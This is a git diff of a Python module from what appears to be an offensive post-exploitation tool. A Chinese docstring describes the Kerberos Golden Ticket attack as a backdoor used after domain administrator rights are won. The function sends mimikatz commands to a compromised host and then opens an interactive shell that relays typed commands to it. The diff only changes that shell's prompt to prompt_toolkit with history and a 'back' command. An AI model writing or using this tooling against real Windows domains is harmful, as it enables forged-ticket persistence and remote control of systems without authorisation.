@@ -1,4 +1,8 @@
 import struct
+from prompt_toolkit import prompt
+from prompt_toolkit.completion import WordCompleter
+from prompt_toolkit.formatted_text import ANSI
+from prompt_toolkit.history import InMemoryHistory
 
 """
 黄金票据攻击，并不是一种普通的攻击方式，该攻击方式其实是一种后门的形式，属于第二次进行攻击的方法，第一次拿到域管权限之后，
@@ -27,14 +31,18 @@ def Golden_Ticket(conn, choice):
     print('\033[1;34;34m' + "[*] Viewing the new tickets:" + '\033[0m')
     command4 = "mimikatz.exe \"privilege::debug\" \"kerberos::tgt\" exit"
     receive(conn, command4)
-    print('\033[1;32;32m' + "[+] Now you can try using 'dir' to connect to the target host" + '\033[0m')
+    # print('\033[1;32;32m' + "[+] Now you can try using 'dir' to connect to the target host" + '\033[0m')
+    commands = ["back"]
+    completer = WordCompleter(commands)
+    formatted_text1 = ANSI('\033[1;32;32mGold Ticket > \033[0m')
+    history = InMemoryHistory()
     while True:
-        command = input('\033[1;33;33m' + "Gold Ticket > " + '\033[0m')
-        if command.lower() == 'exit':
+        choice = prompt(formatted_text1, completer=completer, history=history)
+        if choice == 'back':
             break
-        elif command == "":
+        elif choice == "":
             continue
-        receive(conn, command)
+        receive(conn, choice)
 
 
 def receive(conn, command):
